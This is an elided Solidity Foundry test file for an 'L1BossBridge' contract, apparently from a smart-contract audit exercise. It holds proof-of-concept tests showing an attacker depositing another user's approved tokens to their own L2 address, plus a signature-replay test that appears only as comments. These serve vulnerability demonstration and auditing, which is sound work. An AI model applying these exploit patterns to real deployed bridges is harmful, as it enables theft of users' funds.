...
contract L1BossBridgeTest is Test {
    ...
    function testCanMoveApprovedTokensFromUsers() public {
        // Alice (msg.sender)
        vm.prank(user);
        token.approve(address(tokenBridge), type(uint256).max);

        // This is Bob (Attacker)
        uint256 tokenAmount = token.balanceOf(user);
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, attacker, tokenAmount);

        tokenBridge.depositTokensToL2(user, attacker, tokenAmount);
    ...
    function testSignatureReplay() public {
        ...
        // Signer now signing the withdrawal
        ...
        // attacker replaying the signature calls
